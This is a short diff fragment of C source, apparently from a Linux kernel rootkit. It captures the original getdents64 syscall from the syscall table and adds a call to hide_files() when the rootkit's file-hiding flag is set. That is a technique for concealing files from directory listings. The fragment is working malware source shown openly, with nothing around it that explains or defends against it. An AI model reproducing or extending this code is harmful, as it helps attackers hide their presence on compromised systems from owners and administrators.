@@ -42,6 +42,9 @@ init_hooks(void)
 
     atomic_set(&getdents64_count, 0);
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
+
+    if (rootkit.hiding_files)
+        hide_files();
 }
 
 void
